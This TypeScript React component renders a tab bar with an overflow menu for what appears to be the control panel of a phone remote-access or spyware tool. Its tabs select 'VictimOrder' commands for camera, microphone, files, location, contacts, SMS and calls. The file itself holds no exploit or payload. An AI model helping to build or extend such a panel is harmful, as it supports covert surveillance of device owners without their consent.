import {
    Button,
    Menu,
    MenuItem,
    MenuList,
    MenuPopover,
    MenuTrigger,
    Overflow,
    OverflowItem,
    Tab,
    TabList,
    useIsOverflowItemVisible,
    useOverflowMenu,
} from '@fluentui/react-components';
import {
    bundleIcon,
    Call24Filled,
    Camera24Filled,
    Folder24Filled,
    Location24Filled,
    Mail24Filled,
    MicRecord24Filled,
    MoreHorizontal24Filled,
    MoreHorizontal24Regular,
    PeopleCommunity24Filled,
} from '@fluentui/react-icons';
import React from 'react';

import { VictimOrder } from '../../../common/enums';

const MoreHorizontal = bundleIcon(
    MoreHorizontal24Filled,
    MoreHorizontal24Regular,
);

interface IItem {
    icon: React.ReactElement;
    label: string;
    value: VictimOrder;
}

interface ITabListWithOverflowProps {
    selectedTab: VictimOrder;
    setSelectedTab: (selectedTab: VictimOrder) => void;
}

interface IMenuItemProps {
    item: IItem;
    onClick: (item: IItem) => void;
}

interface IMenuProps {
    onClick: (item: IItem) => void;
}

const tabItems: IItem[] = [
    {
        icon: <Camera24Filled />,
        label: 'Camera',
        value: VictimOrder.CAMERA,
    },
    {
        icon: <Folder24Filled />,
        label: 'Files',
        value: VictimOrder.FILE_MANAGER,
    },
    {
        icon: <MicRecord24Filled />,
        label: 'Microphone',
        value: VictimOrder.MICROPHONE,
    },
    {
        icon: <Location24Filled />,
        label: 'Location',
        value: VictimOrder.LOCATION,
    },
    {
        icon: <PeopleCommunity24Filled />,
        label: 'Contacts',
        value: VictimOrder.CONTACTS,
    },
    {
        icon: <Mail24Filled />,
        label: 'SMS',
        value: VictimOrder.SMS,
    },
    {
        icon: <Call24Filled />,
        label: 'Calls',
        value: VictimOrder.CALLS,
    },
];

const OverflowMenuItem: React.FC<IMenuItemProps> = (props) => {
    const isVisible = useIsOverflowItemVisible(props.item.value);

    if (isVisible) {
        return null;
    }

    return (
        <MenuItem
            key={props.item.value}
            icon={props.item.icon}
            onClick={() => {
                props.onClick(props.item);
            }}
        >
            <div>{props.item.label}</div>
        </MenuItem>
    );
};

const OverflowMenu: React.FC<IMenuProps> = (props) => {
    const { ref, isOverflowing, overflowCount } =
        useOverflowMenu<HTMLButtonElement>();

    const onItemClick = (item: IItem): void => {
        props.onClick(item);
    };

    if (!isOverflowing) {
        return null;
    }

    return (
        <Menu hasIcons>
            <MenuTrigger disableButtonEnhancement>
                <Button
                    appearance='transparent'
                    className='overflow-menu-trigger'
                    ref={ref}
                    icon={<MoreHorizontal />}
                    aria-label={`${overflowCount} more tabs`}
                    role='tab'
                />
            </MenuTrigger>
            <MenuPopover>
                <MenuList className='overflow-menu'>
                    {tabItems.map((item) => (
                        <OverflowMenuItem
                            key={item.value}
                            item={item}
                            onClick={() => {
                                onItemClick(item);
                            }}
                        />
                    ))}
                </MenuList>
            </MenuPopover>
        </Menu>
    );
};

export const TabListWithOverflow: React.FC<ITabListWithOverflowProps> = (
    props,
) => {
    return (
        <Overflow minimumVisible={2}>
            <TabList
                size='large'
                selectedValue={props.selectedTab}
                onTabSelect={(_, data) => {
                    props.setSelectedTab(data.value as VictimOrder);
                }}
            >
                {tabItems.map((item) => (
                    <OverflowItem
                        key={item.value}
                        id={item.value}
                        priority={item.value === props.selectedTab ? 2 : 1}
                    >
                        <Tab value={item.value} icon={item.icon}>
                            {item.label}
                        </Tab>
                    </OverflowItem>
                ))}
                <OverflowMenu
                    onClick={(item) => {
                        props.setSelectedTab(item.value);
                    }}
                />
            </TabList>
        </Overflow>
    );
};
